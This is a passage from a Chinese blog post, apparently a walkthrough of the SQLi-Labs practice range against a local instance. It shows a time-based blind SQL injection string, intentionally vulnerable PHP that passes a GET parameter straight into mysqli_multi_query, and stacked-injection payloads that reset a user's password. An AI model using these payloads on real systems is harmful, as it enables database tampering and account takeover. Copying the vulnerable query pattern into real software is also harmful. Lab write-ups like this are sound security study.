640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token comment"># ?sort=x' OR sleep(if(substr(database(),1,1)='!', 0.3, 0)) --+</span></code></pre></div><h3 class="x-h2">L50-L53</h3><p class="x-p">服务端使用<code class="x-inline-highlight">mysqli_multi_query</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$sort</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY <span class="token interpolation"><span class="token variable">$sort</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// BY '$sort'"</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
</code></pre></div><p class="x-p">使用堆叠注入是最简单的方式。L52和L53分别是L50和L51的盲注版本。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?sort=1; UPDATE security.users SET password='hacked-L50' WHERE id='1'; -- "</span>
payload <span class="token operator">=</span> <span class="token string">"?sort=1'; UPDATE security.users SET password='hacked-L51' WHERE id='1'; -- "</span>
payload <span class="token operator">=</span> <span class="token string">"?sort=1; UPDATE security.users SET password='hacked-L52' WHERE id='1'; -- "</span>
payload <span class="token operator">=</span> <span class="token string">"?sort=1'; UPDATE security.users SET password='hacked-L53' WHERE id='1'; -- "</span>
</code></pre></div><!--/$--><button class="like-button not-loaded"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 1024 896"><path d="M512 911l-62-56C230 655 85 524 85 363 85 231 189 128 320 128c74 0 145 35 192 89 47-55 118-89 192-89 131 0 235 103 235 235 0 161-145 293-365 492l-62 56z" fill="#FCFCFC"></path></svg></button></div><div id="sidebar"><div id="sidebar-width-wrapper"><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">CTF<!-- --> (<!-- -->13<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/25c/wp-idekctf-justctf-2025/"><span>idekCTF 2025 &amp; justCTF 2025 Writeup</span></a></li><li><a class="link" href="/25c/wp-shakti-ctf-2025/"><span>Shakti CTF 2025 Writeup</span></a></li><li><a class="link" href="/25c/wp-downunder-ctf-2025/"><span>DownUnder CTF 2025 Writeup</span></a></li><li><a class="link" href="/25b/wp-nahamcon-ctf-2025/"><span>NahamCon CTF 2025 Writeup</span></a></li><li><a class="link" href="/25b/wp-1753ctf-2025/"><span>1753CTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-swampctf-2025/"><span>SwampCTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-cyber-apocalypse-ctf-2025/"><span>HTB Cyber Apocalypse CTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-picoctf-2025/"><span>picoCTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-nullcon-hackim-2025/"><span>Nullcon HackIM CTF 2025 Writeup</span></a></li><li><a class="link" href="/24d/wp-0xl4ugh-2024/"><span>0xl4ugh CTF 2024 Writeup</span></a></li><li><a class="link" href="/24d/wp-m0lecon-2025/"><span>m0leCon Beginner CTF 2025 Writeup</span></a></li><li><a class="link" href="/24d/wp-1337uplive-2024/"><span>1337UP LIVE CTF 2024 Writeup</span></a></li><li><a class="link" href="/24d/wp-bluehens-2024/"><span>BlueHens CTF 2024 Writeup</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">安全学习<!-- --> (<!-- -->12<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/25d/bugku-apache-log4j2-rce/"><span>Bugku靶场Apache Log4j2 RCE</span></a></li><li><a class="link" href="/25d/sqli-labs/"><span>SQLi Labs</span></a></li><li><a class="link" href="/24d/papers-sec-241207-aimie/"><span>论文阅读：Understanding and Detecting Abused Image Hosting Modules as Malicious Services (CCS 2023)</span></a></li><li><a class="link" href="/24d/wp-portswigger/"><span>PortSwigger Writeup</span></a></li><li><a class="link" href="/24c/papers-sec-240922-pre-hijacked-accounts/"><span>论文阅读：Pre-hijacked accounts: An Empirical Study of Security Failures in User Account Creation on the Web (Security 2022)</span></a></li><li><a class="link" href="/24c/papers-sec-240902-pafa-authentication/"><span>论文阅读：Maginot Line: Assessing a New Cross-app Threat to PII-as-Factor Authentication in Chinese Mobile Apps (NDSS 2024)</span></a></li><li><a class="link" href="/24c/papers-sec-240824-zxcvbn/"><span>论文阅读：zxcvbn: Low-Budget Password Strength Estimation (Security 2016)</span></a></li><li><a class="link" href="/24c/papers-sec-240817-2fa-failures/"><span>论文阅读：Security and Privacy Failures in Popular 2FA Apps (Security 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240810-conquer/"><span>论文阅读：Do Not Give A Dog Bread Every Time He Wags His Tail: Stealing Passwords through Content Queries (CONQUER) Attack (NDSS 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240728-2fa-consistency/"><span>论文阅读：A Systematic Study of the Consistency of Two-Factor Authentication User Journeys on Top-Ranked Websites (NDSS 2023)</span></a></li><li><a class="link active" href="/24b/learn-cwes/"><span>Learn CWEs &amp; Real-word Examples</span></a></li><li><a class="link" href="/24b/papers-sec-240514-taintmini/"><span>论文阅读：TAINTMINI: Detecting Flow of Sensitive Data in Mini-Programs with Static Taint Analysis (ICSE 2023)</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">网络杂识<!-- --> (<!-- -->7<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/25b/debug-x86_64-program-in-arm64-system/"><span>使用QEMU在ARM64系统上调试x86_64程序</span></a></li><li><a class="link" href="/24b/injective-surjective-bijective/"><span>单射、满射、双射</span></a></li><li><a class="link" href="/24a/git-merge-allow-unrelated-histories/"><span>记录：使用--allow-unrelated-histories</span></a></li><li><a class="link" href="/24a/deepl-shortcut-setting/"><span>解决：DeepL该快捷键已被使用</span></a></li><li><a class="link" href="/23d/github-linguist-vendored/"><span>不统计Github仓库某个目录下的语言</span></a></li><li><a class="link" href="/23d/hust-cas-login/"><span>Python登录华科统一身份认证接口</span></a></li><li><a class="link" href="/23d/database-3nf/"><span>数据库设计三大范式</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">算法<!-- --> (<!-- -->26<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24b/leetcode-1739/"><span>LeetCode 1739.放置盒子</span></a></li><li><a class="link" href="/24b/leetcode-1373/"><span>LeetCode 1373.二叉搜索子树的最大键值和</span></a></li><li><a class="link" href="/24b/leetcode-312/"><span>LeetCode 312.戳气球</span></a></li><li><a class="link" href="/24d/leetcode-282/"><span>LeetCode 282.给表达式添加运算符</span></a></li><li><a class="link" href="/24c/leetcode-149/"><span>LeetCode 149.直线上最多的点数</span></a></li><li><a class="link" href="/24c/leetcode-85/"><span>LeetCode 85.最大矩形</span></a></li><li><a class="link" href="/24b/leetcode-84/"><span>LeetCode 84.柱状图中最大的矩形</span></a></li><li><a class="link" href="/24c/leetcode-68/"><span>LeetCode 68.文本左右对齐</span></a></li><li><a class="link" href="/24b/leetcode-65/"><span>LeetCode 65.有效数字</span></a></li><li><a class="link" href="/24b/leetcode-60/"><span>LeetCode 60.排列序列</span></a></li><li><a class="link" href="/24c/leetcode-52/"><span>LeetCode 52.N皇后 II</span></a></li><li><a class="link" href="/24c/leetcode-51/"><span>LeetCode 51.N皇后</span></a></li><li><a class="link" href="/24c/leetcode-42/"><span>LeetCode 42.接雨水</span></a></li><li><a class="link" href="/24b/leetcode-37/"><span>LeetCode 37.解数独</span></a></li><li><a class="link" href="/24b/leetcode-30/"><span>LeetCode 30.串联所有单词的子串</span></a></li><li><a class="link" href="/24b/leetcode-4/"><span>LeetCode 4.寻找两个正序数组的中位数</span></a></li><li><a class="link" href="/24a/csp-2023-09/"><span>CSP 202309 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2023-05/"><span>CSP 202305 T1-T5题解</span></a></li><li><a class="link" href="/24a/csp-2022-06/"><span>CSP 202206 T1-T5题解</span></a></li><li><a class="link" href="/24a/csp-2020-12/"><span>CSP 202012 T1-T5题解</span></a></li><li><a class="link" href="/24a/csp-2020-09/"><span>CSP 202009 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2020-06/"><span>CSP 202006 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2018-03/"><span>CSP 201803 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2016-04/"><span>CSP 201604 T1-T4题解</span></a></li><li><a class="link" href="/24b/mst-and-sp/"><span>最小生成树与最短路算法</span></a></li><li><a class="link" href="/24b/sorting-algorithm/"><span>排序算法总结与代码实现</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">深度学习<!-- --> (<!-- -->7<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24c/model-optimization/"><span>模型优化概述：量化、压缩、轻量化</span></a></li><li><a class="link" href="/24c/winograd/"><span>Winograd算法</span></a></li><li><a class="link" href="/24b/yolov5-obb-nms-rotated/"><span>解决：nms_rotated报错&quot;THC/THC.h&quot;: No such file or directory</span></a></li><li><a class="link" href="/24a/reproduce-nerf-rpn/"><span>复现：NeRF-RPN</span></a></li><li><a class="link" href="/23d/learn-rnn-lstm/"><span>学习RNN和LSTM</span></a></li><li><a class="link" href="/23d/object-detection-map/"><span>目标检测评价指标mAP</span></a></li><li><a class="link" href="/23d/r2plus1d/"><span>行为识别R(2+1)D网络</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">编程语言<!-- --> (<!-- -->7<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/25d/advanced-javascript/"><span>JavaScript进阶特性</span></a></li><li><a class="link" href="/25c/python-decorator/"><span>Python装饰器</span></a></li><li><a class="link" href="/24c/asm8086-snake/"><span>8086汇编贪吃蛇</span></a></li><li><a class="link" href="/24a/object-oriented-programming-python/"><span>Python面向对象编程</span></a></li><li><a class="link" href="/24a/torch-numpy-topk/"><span>在pytorch和numpy中取top-k值和索引</span></a></li><li><a class="link" href="/24a/cpp-stl/"><span>C++中STL的基本使用</span></a></li><li><a class="link" href="/23c/js-array/"><span>JavaScript数组常用方法</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">前端<!-- --> (<!-- -->2<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24d/android-send-explicit-intent-to-dynamically-registered-receiver/"><span>不能向动态注册的广播接收器发送显式Intent</span></a></li><li><a class="link" href="/23d/css-auto-height-transition/"><span>CSS实现auto高度的过渡动画</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">课程笔记<!-- --> (<!-- -->19<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/25a/tai-e-a3-solution/"><span>【程序分析】南京大学软件分析Lab3（死代码消除）思路</span></a></li><li><a class="link" href="/25a/tai-e-a2-additional-case/"><span>【程序分析】南京大学软件分析Lab2（常量传播）易错样例补充</span></a></li><li><a class="link" href="/25a/program-analysis-summary/"><span>【程序分析】知识汇总</span></a></li><li><a class="link" href="/24c/assembly-6/"><span>【汇编语言】中断及外部设备操作</span></a></li><li><a class="link" href="/24c/assembly-5/"><span>【汇编语言】标志寄存器</span></a></li><li><a class="link" href="/24c/assembly-4/"><span>【汇编语言】流程转移与子程序</span></a></li><li><a class="link" href="/24c/assembly-3/"><span>【汇编语言】内存寻址方式</span></a></li><li><a class="link" href="/24c/assembly-2/"><span>【汇编语言】汇编语言编程</span></a></li><li><a class="link" href="/24c/assembly-1/"><span>【汇编语言】访问寄存器和内存</span></a></li><li><a class="link" href="/24a/games101-04-geometry/"><span>【GAMES101】Geometry</span></a></li><li><a class="link" href="/24a/games101-03-shading/"><span>【GAMES101】Shading</span></a></li><li><a class="link" href="/24a/games101-02-rasterization/"><span>【GAMES101】Rasterization</span></a></li><li><a class="link" href="/24a/games101-01-transformation/"><span>【GAMES101】Transformation</span></a></li><li><a class="link" href="/23d/protocols/"><span>【计算机网络】协议总结</span></a></li><li><a class="link" href="/23d/pattern-recognition-4/"><span>【模式识别】线性学习器与线性分类器</span></a></li><li><a class="link" href="/23c/pattern-recognition-3/"><span>【模式识别】非参数估计</span></a></li><li><a class="link" href="/23c/pattern-recognition-2/"><span>【模式识别】参数估计</span></a></li><li><a class="link" href="/23c/pattern-recognition-1/"><span>【模式识别】统计决策方法</span></a></li><li><a class="link" href="/24b/rank-inequality/"><span>【线性代数】对秩不等式的理解</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">杂记<!-- --> (<!-- -->1<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24d/about-interactive-multimedia/"><span>关于交互式多媒体</span></a></li></ul></div></div></div></div><div id="sidebar-mask"></div></div><script src="/_next/static/chunks/webpack-0342f5c61310a5b4.js" crossorigin="" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/css/17b3c4485edf7c41.css\",\"style\",{\"crossOrigin\":\"\"}]\n0:\"$L2\"\n"])</script><script>self.__next_f.push([1,"3:HL[\"/_next/static/css/3bc7e8f21884ab46.css\",\"style\",{\"crossOrigin\":\"\"}]\n4:HL[\"/_next/static/css/204cf8343107233c.css\",\"style\",{\"crossOrigin\":\"\"}]\n"])</script><script>self.__next_f.push([1,"5:I[47690,[],\"\"]\n7:I[55329,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-335eac9e82ade5ca.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-c9e2b3f85eaee606.js\"],\"\"]\n8:I[76842,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-335eac9e82ade5ca.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-c9e2b3f85eaee606.js\"],\"PostMeta\"]\n9:\"$Sreact.suspense\"\nb:I[76842,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-335eac9e82ade5ca.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-c9e2b3f85eaee606.js\"],\"LikeButton\"]\nc:I[5613,[],\"\"]\ne:I[31778,[],\"\"]\nf:I[89806,[\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"372\",\"static/chunks/372-ec5dc2d8977a9d05.js\",\"993\",\"static/chunks/app/(posts)/layout-e15e5287e741ad91.js\"],\"\"]\n10:I[25694,[\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"185\",\"static/chunks/app/layout-9af8316721e2155d.js\"],\"GlobalProvider\"]\n11:I[30397,[\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"185\",\"static/chunks/app/layout-9af8316721e2155d.js\"],\"\"]\n13:I[48955,[],\"\"]\nd:[\"slug\",\"25d/sqli-labs\",\"c\"]\n14:[]\n"])</script><script>self.__next_f.push([1,"2:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/17b3c4485edf7c41.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],[\"$\",\"$L5\",null,{\"buildId\":\"OmDgkssTyyn1XI7YM_m5G\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/25d/sqli-labs/\",\"initialTree\":[\"\",{\"children\":[\"(posts)\",{\"children\":[[\"slug\",\"25d/sqli-labs\",\"c\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":[\\\"25d\\\",\\\"sqli-labs\\\"]}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"(posts)\",{\"children\":[[\"slug\",\"25d/sqli-labs\",\"c\"],{\"children\":[\"__PAGE__\",{},[\"$L6\",[[\"$\",\"$L7\",null,{}],false,[\"$\",\"h1\",null,{\"className\":\"x-post-title\",\"children\":\"SQLi Labs\"}],[\"$\",\"$L8\",null,{\"path\":\"/25d/sqli-labs/\"}],[\"$\",\"$9\",null,{\"fallback\":[\"$\",\"p\",null,{\"children\":\"Loading component...\"}],\"children\":\"$La\"}],[\"$\",\"$Lb\",null,{\"path\":\"/25d/sqli-labs/\"}]],null]]},[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"(posts)\",\"children\",\"$d\",\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Le\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/204cf8343107233c.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]]}]]},[null,[\"$\",\"div\",null,{\"id\":\"post-layout\",\"children\":[[\"$\",\"div\",null,{\"id\":\"main\",\"className\":\"center-wrapper\",\"children\":[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"(posts)\",\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Le\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":null}]}],[\"$\",\"$Lf\",null,{}]]}],null]]},[null,[\"$\",\"html\",null,{\"lang\":\"zh-CN\",\"suppressHydrationWarning\":true,\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\"}],[\"$\",\"script\",null,{\"async\":true,\"src\":\"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\"}],[\"$\",\"script\",null,{\"async\":true,\"src\":\"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY\"}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\nwindow.dataLayer = window.dataLayer || [];\\nfunction gtag() {\\n    dataLayer.push(arguments);\\n}\\ngtag('js', new Date());\\ngtag('config', 'G-45BYSZ6WPY');\\n\"}}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\nconst currentTheme = localStorage.getItem('theme');\\nif (currentTheme !== 'light' \u0026\u0026 currentTheme !== 'dark') {\\n    localStorage.setItem('theme', 'light');\\n}\\nif (localStorage.getItem('theme') === 'dark') {\\n    document.documentElement.setAttribute('class', 'dark');\\n} else {\\n    document.documentElement.setAttribute('class', 'light');\\n}\\n\"}}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\nif (!Array.prototype.findLast) {\\n    Array.prototype.findLast = function (callback) {\\n        for (let i = this.length - 1; i \u003e= 0; i--) {\\n            if (callback(this[i])) return this[i];\\n        }\\n        return undefined;\\n    };\\n}\\nif (!Array.prototype.findLastIndex) {\\n    Array.prototype.findLastIndex = function (callback) {\\n        for (let i = this.length - 1; i \u003e= 0; i--) {\\n            if (callback(this[i])) return i;\\n        }\\n        return -1;\\n    };\\n}\\n\"}}]]}],[\"$\",\"body\",null,{\"children\":[\"$\",\"$L10\",null,{\"children\":[[\"$\",\"$L11\",null,{}],[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Le\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"div\",null,{\"id\":\"notfound\",\"children\":[[\"$\",\"img\",null,{\"alt\":\"img\",\"src\":\"/images/cry.gif\"}],[\"$\",\"code\",null,{\"id\":\"notfound-404\",\"children\":\"404\"}],[\"$\",\"code\",null,{\"id\":\"notfound-text\",\"children\":\"Page Not Found\"}]]}],\"notFoundStyles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/98e601cf5ba3633d.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/3bc7e8f21884ab46.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]]}]]}]}]]}],null]],\"initialHead\":[false,\"$L12\"],\"globalErrorComponent\":\"$13\",\"missingSlots\":\"$W14\"}]]\n"])</script><script>self.__next_f.push([1,"15:I[62029,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-335eac9e82ade5ca.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-c9e2b3f85eaee606.js\"],\"\"]\n17:I[74365,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"120\",\"static/chunks/120-aab2c7424ca78adb.js\",\"842\",\"static/chunks/842-335eac9e82ade5ca.js\",\"318\",\"static/chunks/app/(posts)/%5B...slug%5D/page-c9e2b3f85eaee606.js\"],\"\"]\n16:T8e9,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e requests\n\nbase_url \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"http://localhost/sqli-labs/\"\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003equery_get\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e**\u003c/span\u003ekwargs\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    url \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e base_url \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e/\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e requests\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eget\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eurl\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e**\u003c/span\u003ekwargs\u003cspan class=\"token 